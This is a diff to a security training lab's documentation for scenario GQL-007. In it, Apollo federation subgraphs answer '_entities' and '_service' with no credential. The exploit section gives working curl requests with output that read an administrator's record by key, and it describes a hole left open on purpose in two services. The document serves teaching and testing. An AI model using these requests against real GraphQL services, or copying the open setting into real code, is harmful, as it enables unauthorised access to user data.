@@ -273,13 +273,14 @@ $ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: 
 
 ### GQL-007 — agent reference
 
-- **Source:** the subgraphs. The gateway's half is built and marked in `apps/gateway/src/graphql/subgraph-data.source.ts`: every subgraph fetch presents `x-internal-token`.
-- **Operation:** `POST /graphql` on a subgraph's own port — `_entities`, `_service`.
-- **Sink:** the subgraph's federation resolvers: `_entities` resolves any entity by key, to any caller.
-- **Flow:** a direct `_entities` call to `127.0.0.1:3101` with no credential reads any user by key, though `user(id)` on the same service is an administrator's question.
-- **Counterparts:** the subgraph half — requiring `x-internal-token` on `_entities` and `_service` — is the lead's work in the three services; this module records what is true today.
-- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts` (against stand-ins that play both halves).
-- **Expected finding:** CWE-306 on each subgraph's federation queries. The gateway's own code is the control.
+- **Source:** `apps/accounts/src/graphql/graphql.module.ts`. Apollo adds `_service` and `_entities` to a subgraph's schema itself, outside the resolvers Nest's global guard runs for, and nothing in accounts asks for a credential on them. The module of `notifications` carries the same weak setting.
+- **Operation:** `POST /graphql` on a subgraph's own port — `_service`, `_entities`.
+- **Sink:** the federation resolvers: `_entities` resolves any entity by key, to any caller.
+- **Flow:** a direct `_entities` call to accounts with no credential reads any user by key, though `user(id)` on the same service is an administrator's question.
+- **Counterparts:** `apps/gateway/src/graphql/subgraph-data.source.ts` — the gateway presents `x-internal-token` on every subgraph fetch, composition included. `apps/trading/src/graphql/graphql.module.ts` — it registers `federation-queries.plugin.ts` beside it, which answers the two queries only to that token and refuses any other caller with 403 before a resolver runs.
+- **Hardened value:** a subgraph requires `x-internal-token` on `_entities` and `_service`.
+- **Tests:** `tests/e2e/scenarios-graphql.e2e-spec.ts` (the lab), `apps/trading/test/federation-queries.int-spec.ts` (the hardened subgraph alone), `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway against stand-ins).
+- **Expected finding:** CWE-306 on accounts' GraphQL module. The gateway's data source and trading's module, which registers the plugin, are the controls: a report on them for this CWE is a false positive.
 
 ### GQL-007 — student guide
 
@@ -288,53 +289,152 @@ Federation needs two queries that no client should ever send directly:
 resolves any entity by its key — the administrator's user record included —
 without the field-level checks the graph's own fields carry. The gateway is
 the only intended caller, and it proves itself with `x-internal-token` on
-every fetch it makes. Today the subgraphs do not ask for that proof: anyone
-who can reach the port can send the queries. Closing it is two halves: the
-gateway presents the token (built), and each subgraph requires it on the two
-federation queries (the lead's work after this service's report).
+every fetch it makes.
+
+The two queries are easy to leave open. Apollo adds them to a subgraph's
+schema after the framework's own resolvers are registered, so the guard that
+protects every other root field never runs for them: the same request that
+`_entities` answers with data is refused by `user(id)`. Closing it is two
+halves, and the lab shows both in place in one subgraph and neither in the
+other two: the gateway presents the token, trading requires it on the two
+federation queries, and accounts and notifications do not — there, anyone
+who can reach the port sends the queries.
 
 ### GQL-007 — exploit lab
 
-The subgraphs speak HTTP/2 in cleartext, which curl cannot send; the
-reproduction uses Node's own client against the same port (in the lab as
-started by `pnpm start`, a client that speaks only HTTP/1.1 reaches the
-service through the relay on port 3201 — see ADR-012):
+Run on 2026-11-28 against the whole lab, started by `pnpm start` on the port
+set below. `accounts` and `trading` speak HTTP/2 in cleartext, which curl
+cannot send, so they are reached through their relays, which change nothing in
+a request ([ADR-012](../../.zazz/architecture/decisions/ADR-012-http1-relay-in-front-of-http2-services.md));
+`notifications` speaks HTTP/1.1 on its own listener. On the defaults the
+addresses are `3000`, `3201`, `3202` and `3103`.
 
 ```console
-$ node -e '…http2.connect("http://127.0.0.1:3101")… stream.end(body)…'
-{"data":{"_entities":[{"id":"u-admin","email":"admin@vcx.exchange"}]}}
-
-$ node -e '…query { user(id: "u-admin") { id } }…'
-{"errors":[{"message":"user(id) is for an administrator",…}],"data":{"user":null}}
+$ GATEWAY=http://127.0.0.1:4400
+$ ACCOUNTS=http://127.0.0.1:4411
+$ TRADING=http://127.0.0.1:4412
+$ NOTIFICATIONS=http://127.0.0.1:4403
 ```
+
+The flaw, in accounts — the administrator's record by key, with no credential:
+
+```console
+$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' \
+    -d '{"query":"{ _entities(representations: [{__typename: \"User\", id: \"u-admin\"}]) { ... on User { id email displayName } } }"}'
+{"data":{"_entities":[{"id":"u-admin","email":"admin@vcx.exchange","displayName":"Admin"}]}}
+
+$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' \
+    -d '{"query":"{ user(id: \"u-admin\") { id email } }"}'
+{"errors":[{"message":"Authentication required","path":["user"],"locations":[…],"extensions":{"code":"UNAUTHENTICATED",…}}],"data":{"user":null}}
+
+$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' -d '{"query":"{ _service { sdl } }"}' | head -c 100
+{"data":{"_service":{"sdl":"extend schema @link(url: \"https://specs.apollo.dev/federation/v2.14",
+```
+
+The same weak setting in notifications — an entity by key, with no credential:
+
+```console
+$ curl -s $NOTIFICATIONS/graphql -H 'content-type: application/json' \
+    -d '{"query":"{ _entities(representations: [{__typename: \"Announcement\", id: \"1\"}]) { ... on Announcement { id title } } }"}'
+{"data":{"_entities":[{"id":"1","title":"Welcome to VCX"}]}}
+```
+
+The same two queries in trading, which requires the token:
+
+```console
+$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' \
+    -d '{"query":"{ _service { sdl } }"}'
+{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}
+
+403
+
+$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' \
+    -d '{"query":"{ _entities(representations: [{__typename: \"Order\", id: \"1\"}]) { ... on Order { id userId symbol } } }"}'
+{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}
+
+403
+```
+
+A session token says who the caller is; it does not say the caller is the
+gateway. The two tokens are obtained through the gateway, as any client would:
+
+```console
+$ A=$(curl -s $GATEWAY/graphql -H 'content-type: application/json' \
+    -d '{"query":"mutation { signIn(email: \"alice@vcx.exchange\", password: \"alice-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)
+
+$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
+    -d '{"query":"{ _entities(representations: [{__typename: \"Order\", id: \"1\"}]) { ... on Order { id } } }"}'
+{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}
+
+403
+```
+
+And the gateway, which presents the token on every fetch, is answered. Each
+of these joins is an `_entities` call — the first to accounts, the second to
+trading:
+
+```console
+$ B=$(curl -s $GATEWAY/graphql -H 'content-type: application/json' \
+    -d '{"query":"mutation { signIn(email: \"admin@vcx.exchange\", password: \"admin-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)
+
+$ curl -s $GATEWAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
+    -d '{"query":"{ orders { id symbol user { id email displayName } } }"}'
+{"data":{"orders":[{"id":"1","symbol":"BTC-USD","user":{"id":"u-alice","email":"alice@vcx.exchange","displayName":"Alice"}},{"id":"6","symbol":"SOL-USD","user":{"id":"u-alice","email":"alice@vcx.exchange","displayName":"Alice"}}]}}
+
+$ curl -s $GATEWAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $B" \
+    -d '{"query":"{ user(id: \"u-alice\") { id orders { id symbol } } }"}'
+{"data":{"user":{"id":"u-alice","orders":[{"id":"1","symbol":"BTC-USD"},{"id":"6","symbol":"SOL-USD"}]}}}
+```
+
+Each error above also carries a stack, in `extensions.stacktrace`, and the
+guard's error a copy of the underlying exception; these are left out here,
+where `…` stands. The stack is the subject of GQL-004.
 
 The observation that proves exploitation: the first call — `_entities` with
 the representation `{__typename: "User", id: "u-admin"}` and no credential at
-all — answers the administrator's own record, while the second, the guarded
-field for the same record, refuses the same caller. The data the service
-protects is reachable through the query it never checks.
+all — answers the administrator's own record, while the guarded field for the
+same record refuses the same caller. The data the service protects is
+reachable through the query it never checks. In Postman: `GQL-007 a direct
+_entities call reads any user by key` in the gateway collection. In Burp: the
+same requests, sent to the accounts relay's address.
 
 ### GQL-007 — vulnerable and protected
 
-The gateway's half is the control: `subgraph-data.source.ts` presents
-`x-internal-token` on every fetch, composition included (`apps/gateway/test/graph.int-spec.ts`
-asserts it reached every stand-in). The hardened value of the subgraph half —
-a subgraph that answers `_entities` and `_service` only on presentation of
-the token — is played by the stand-ins in the tests: with it on, the direct
-call above is refused 403 and the graph still answers, because the gateway's
-token crosses with every fetch. The claim is scoped: this pattern closes the
-federation queries to callers that are not the gateway; it says nothing about
-the subgraphs' other fields.
+| | Why |
+| --- | --- |
+| `apps/accounts/src/graphql/graphql.module.ts` — vulnerable | `_service` and `_entities` are added to the schema by Apollo's `buildSubgraphSchema`, outside the handlers the global guard wraps. Nothing else asks, so the guard that refuses `user(id)` to the same caller is never consulted. The module of `notifications` is built the same way, and answers the same. |
+| `apps/gateway/src/graphql/subgraph-data.source.ts` — protected | `willSendRequest` sets `x-internal-token` on every subgraph fetch, composition included, so a subgraph that asks for it is answered: the last two calls above. |
+| `apps/trading/src/graphql/graphql.module.ts` — protected | It registers `federationQueriesNeedTheToken`. Once the operation is validated, and before any resolver, an operation that selects `_entities` or `_service` — at the root, under an alias, through a fragment — is refused with 403 unless the request's `x-internal-token` is the run's own. A session token is not it: that is why the call with `$A` is refused. |
+
+The plugin's registration is the hardened value of the setting, in place in
+one of the three subgraphs. The claim is scoped: this pattern closes the two
+federation queries of trading to callers that are not the gateway, for the
+identical request. It says nothing about any other field of trading, and
+nothing about accounts or notifications.
 
 ### GQL-007 — tests
 
-`apps/gateway/test/scenarios/gql.int-spec.ts`: one test sends `_entities`
-directly to the stand-in with no token and asserts `u-admin`'s record comes
-back, then the same record through `user(id)` and asserts the refusal; one
-test turns the stand-in's `requireInternalToken` on and asserts the direct
-call is refused 403, that a call presenting the token still answers, and that
-the gateway's own join — `orders { user { email } }`, itself an `_entities`
-call — still resolves through the graph.
+`tests/e2e/scenarios-graphql.e2e-spec.ts`, against the lab: one test sends
+`_entities` to accounts' own listener with no credential and asserts
+`u-admin`'s record comes back, then the same record through `user(id)`, refused;
+one asserts notifications answers the two queries with no credential too; one
+sends the two queries to trading and asserts 403, `FORBIDDEN` and no data; one
+asserts a plain user's and an administrator's session token change nothing;
+one asserts a call presenting the service token is answered and that the
+gateway's joins still resolve, the one that is an `_entities` call to trading
+among them; one asserts trading's ordinary operations answer as before; one
+asserts the same refusal and the same answer through the relay.
+
+`apps/trading/test/federation-queries.int-spec.ts`, the subgraph alone: the
+three refusals — no credential, a session token, a query hidden under an
+alias and a fragment — and the two answers, with the service token and for an
+operation that is neither federation query. With the plugin's registration
+removed from the module, its three refusal tests fail. The rest of trading's
+suite calls `_entities` as the gateway does, presenting the service token.
+
+`apps/gateway/test/scenarios/gql.int-spec.ts`: the gateway's half, against
+stand-ins that play a subgraph either way — with the token required, the
+direct call is refused 403 and the graph still answers.
 
 ## Scope of the counterparts
 
